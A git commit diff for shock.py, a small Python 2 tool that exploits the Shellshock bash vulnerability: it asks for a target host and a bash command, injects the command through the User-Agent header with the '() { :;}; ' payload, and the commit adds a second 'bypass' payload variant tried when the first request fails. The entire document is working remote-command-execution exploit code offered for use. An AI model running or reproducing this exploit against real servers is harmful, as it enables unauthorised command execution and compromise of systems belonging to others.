9c2b8338aeabc27f556bab5af98ee5b3b1521a09
NinJaSl0th <sl0th@force-sec.com>
2014-09-26 13:22:06 -0400

    Add bypass

--- shock.py
+++ shock.py
@@ -12,7 +12,14 @@ import readline
 hostname = raw_input("Enter host: ")
 cmmd = raw_input("Enter bash command: ")
 
-
-req = urllib2.Request(hostname, headers={ 'User-Agent': '() { :;}; '+cmmd })
-html = urllib2.urlopen(req).read()
-print html
+try:
+  req = urllib2.Request(hostname, headers={ 'User-Agent': '() { :;}; '+cmmd })
+  html = urllib2.urlopen(req).read()
+  print html
+except urllib2.HTTPError:
+  try:
+    req = urllib2.Request(hostname, headers={ 'User-Agent': '() { (a)=>\ '+cmmd })
+    html = urllib2.urlopen(req).read()
+    print html
+  except:
+    exit("Could not exploit!")
